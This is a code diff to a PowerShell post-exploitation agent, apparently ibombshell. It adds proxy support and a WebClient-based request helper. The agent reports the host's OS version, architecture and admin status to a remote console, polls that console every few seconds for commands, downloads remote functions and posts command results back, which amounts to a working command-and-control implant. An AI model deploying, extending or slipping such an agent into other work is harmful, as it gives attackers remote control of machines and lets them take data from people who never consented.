@@ -3,8 +3,15 @@ function console{
     param(
         [Switch] $Silently,
         [String] $uriConsole,
-        [String] $id
+        [String] $id,
+        [String] $proxy
     )
+
+    if ($proxy){ 
+        if(-not $proxy.startswith("http")){
+            $proxy = "http://"+$proxy
+        }
+    }
 
      if ($PSVersionTable.PSVersion.Major -lt 3) {
 	  return "Upgrade your powershell to version 3 or higher"
@@ -21,9 +28,30 @@ function console{
         )
 
         $RawURL = $RawBase + $RawFunctions + $command
+        return make_request -URL $RawURL
+    }
 
-        return (iwr -UseBasicParsing -Headers @{"Cache-Control"="no-cache"}  -uri $RawURL).Content
+    function make_request{
+        param(
+            [string] $method="GET",
+            [Parameter(Mandatory)]
+            [string] $URL,
+            [string] $data
+        )
+        $wc = new-object system.net.WebClient
+        if ($proxy){
+            $prx = new-object System.Net.WebProxy
+            $prx.Address = $proxy
+            $wc.proxy = $prx
+        }
 
+        if ($method -eq "POST"){
+            $wc.UploadString($url, "POST", $data)
+        } else{
+            $webpage = $wc.DownloadData($url)
+            $data = [System.Text.Encoding]::ASCII.GetString($webpage)
+            return $data
+        }
     }
 
     # READFUNCTIONS BEGIN
@@ -114,8 +142,8 @@ function console{
         }
 
         $info = Get-CimInstance -ClassName Win32_OperatingSystem
-        $os_version = $info.caption | Out-String
-        $os_arch = $info.OSArchitecture | Out-String
+        $os_version = ($info.caption | Out-String).TrimEnd("`r`n")
+        $os_arch = ($info.OSArchitecture | Out-String).TrimEnd("`r`n")
 
         #i am new warrior
         if($uriConsole.Length -ne 0)
@@ -125,14 +153,13 @@ function console{
             {
                 try 
                 {
-                    $data = @{
-                        os_version=$os_version
-                        os_arch=$os_arch
-                        admin=$admin
-                    }
 
-                    $info = $data | ConvertTo-Json
-                    $req = iwr -UseBasicParsing -Method POST -Uri "$uriConsole/newibombshell/$id" -Body @{results=$info}
+                $info = @"
+results={"os_version":"$os_version", "os_arch":"$os_arch", "admin":"$admin"}
+"@
+
+
+                    $req = make_request -method "POST" -URL "$uriConsole/newibombshell/$id" -data $info
                     break
                 }
                 catch 
@@ -164,7 +191,7 @@ function console{
 
         try{
             #getting function's list
-            $list = (new-object net.webclient).downloadstring($functionsList)
+            $list = make_request -URL $functionsList
         }catch{
                $list = "" 
         }
@@ -199,7 +226,7 @@ function console{
             {
                 try 
                 {
-                    $content = (iwr -UseBasicParsing -Uri "$uriConsole/ibombshell/$id").content 
+                    $content = make_request -URL "$uriConsole/ibombshell/$id"
                 } 
                 catch 
                 {
@@ -227,7 +254,10 @@ function console{
                         }
                         $results = $send
                     }
-                    iwr -UseBasicParsing -Method POST -Uri "$uriConsole/ibombshell/$id" -Body @{results=$results}
+                    $results = @"
+results=$results
+"@
+                    $r = make_request -method "POST" -URL "$uriConsole/ibombshell/$id"  -data $results
                 } 
             }
             sleep 5
